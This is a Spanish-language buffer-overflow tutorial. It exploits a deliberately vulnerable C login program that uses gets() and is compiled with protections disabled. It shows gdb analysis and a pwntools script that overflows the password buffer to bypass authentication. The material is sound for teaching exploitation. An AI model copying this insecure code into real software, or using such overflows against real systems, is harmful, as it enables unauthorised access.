---
original autor: CrazyCat
coautor: naibu3
---

#bufferOverflow 

# 01_BO_Stack_Variable_Overwritting

## ¿Qué es?

En el ejercicio anterior vimos como es posible sobreescribir registros adyacentes a una variable que actúa como buffer. Ahora, veremos como podemos aprovecharnos de esta vulnerabilidad para sobreescribir variables sensibles cercanas en memoria. Más concretamente en la zona del *stack* o *pila*, donde se guardan las variables *estáticas*.

Además trataremos de crear un script que automatice la interacción con el binario.
 
 -----
 
## Ejercicio 1

### Compilar el binario

Para este ejercicio utilizaremos el siguiente código:

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
    char password[6];
    int authorised = 0;

    printf("Enter admin password: \n");
    gets(password);

    if(strcmp(password, "pass") == 0)
    {
        printf("Correct Password!\n");
        authorised = 1;
    }
    else
    {
        printf("Incorrect Password!\n");
    }

    if(authorised)
    {
        printf("Successfully logged in as Admin (authorised=%d) :)\n", authorised);
    }else{
		printf("Failed to log in as Admin (authorised=%d) :(\n", authorised);
	}

    return 0;
}
```

Estará en el fichero *login.c*. Como es un código en C debemos compilarlo (igual que el ejercicio anterior):

```bash
gcc -o login login.c -fno-stack-protector -z execstack -no-pie -m32
```

### Análisis del binario

Comenzamos comprobando sólo con el comando `file`:

```bash
file login
```
```file
login: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=3e09d2aa3945eabf7f50403d0a6f9c39fd6d360e, for GNU/Linux 3.2.0, not stripped
```

Vemos que es un binario de 32 bits, *dinamically linked* y que es *not stripped*. Vamos a lanzar ahora [[checksec]]:

```bash
checksec login
```
```checksec
Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

Vemos que no tiene ninguna seguridad activa. Vamos a probar a ejecutarlo:

```bash
./login
```
```login
Enter admin password: 
123
Incorrect Password!
Failed to log in as Admin (authorised=0) :(
```

Vemos que si introducimos la contraseña `123` nos dice que es incorrecta. Aemás nos muestra lo que parece el valor de una variable `authorised`. Vamos a intentar desbordar la variable `password`:

```login
Enter admin password: 
aaaaaaaaa
Incorrect Password!
Successfully logged in as Admin (authorised=6381921) :)
```

Hemos introducido muchas "*a*", de forma que nos dice que la contraseña es incorrecta, pero la variable authorised ha sido sobreescrita, valiendo ahora `6381921`.

#### Análisis con [[ltrace]] o [[strace]]

No será posible utilizar esta herramienta en la mayor parte de los casos, sin embargo podemos utilizarla en este ejercicio para ver qué funciones se llaman en cada momento:

```bash
ltrace login
```
```ltrace
write(1, "Enter admin password: \n", 23Enter admin password: 
) = 23
fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x2), ...}) = 0
read(0, aaaaaaaa
"aaaaaaaa\n", 1024)             = 9
write(1, "Incorrect Password!\n", 20Incorrect Password!
)   = 20
write(1, "Successfully logged in as Admin "..., 54Successfully logged in as Admin (authorised=24929) :)
) = 54
exit_group(0)
```

Así podríamos ver qué está pasando.

#### Análisis con [[gdb]]

Vamos a ver ahora el análisis que haríamos normalmente. Para ello lanzamos [[gdb]]-[[pwndbg]]:

```bash
gdb-pwndbg login
```

Una vez dentro podemos verlas funciones con `info functions` aunque sólo tenemos `main()`, por lo que la descompilamos:

```gdb
disassemble main
```
```gdb
[...]
0x08049216 <+132>:	call   0x8049060 <puts@plt>
0x0804921b <+137>:	add    esp,0x10
0x0804921e <+140>:	cmp    DWORD PTR [ebp-0xc],0x0
0x08049222 <+144>:	je     0x804923b <main+169>
0x08049224 <+146>:	sub    esp,0x8
[...]
```

Vemos que tenemos una comparación entre el registro `ebp-0xc` y el valor `0x0`. Si lo comprobamos en [[ghidra]] veremos que dicho registro corresponde a la variable `authorised`. Vamos a establecer un *breaking point* en dicho punto:

```gdb
break 0x0804921e
ó
break *main+140
```

Ejecutamos el programa con `run` e introducimos una contraseña de prueba, por ejemplo `aaaa`:

```gdb
Enter admin password: 
test
Incorrect Password!
```

Ahora parará en el *break point*, permitiendonos ver el valor del registro que mencionamos antes:

```gdb
x $ebp - 0xc
```
```gdb
0xffffd07c:	0x00000000
```

Vemos que el valor del registro es `0` (en hexadecimal). Vamos a cambiarlo a `1`, debemos utilizar la dirección del registro, ya que `ebp - 0xc` guarda la dirección de dicho registro:

```gdb
set *0xffffd07c = 1
```

Si volvemos a mirar `ebp - 0xc`, veremos que ahora vale `1`:

```gdb
x $ebp - 0xc
```
```gdb
0xffffd07c:	0x00000001
```

Si continuamos la ejecución con `c`, veremos que ahora nos permitirá el acceso incluso sin haber proporcionado la contraseña correcta:

```gdb
Continuing.
Successfully logged in as Admin (authorised=1) :)
```


#### Script

Para practicar scripting podemos crear un script simple en python utilizando la librería [[pwntools]], que explote la vulnerabilidad:

```python
#!/bin/python3
from pwn import *

#Start binary
io = process('./login')    #En caso de ser un servidor remoto sería remote()

#Send string to overflow buffer
io.sendlineafter(b':', b'aaaaaaa')    #Manda la linea despues de detectar el prompt (:)

#Receive output
print(io.recvall().decode())
```

Si ejecutamos, funciona!

```python
[+] Starting local process './login': pid 4862
[+] Receiving all data: Done (73B)
[*] Process './login' stopped with exit code 0 (pid 4862)
 
Incorrect Password!
Successfully logged in as Admin (authorised=97) :)
```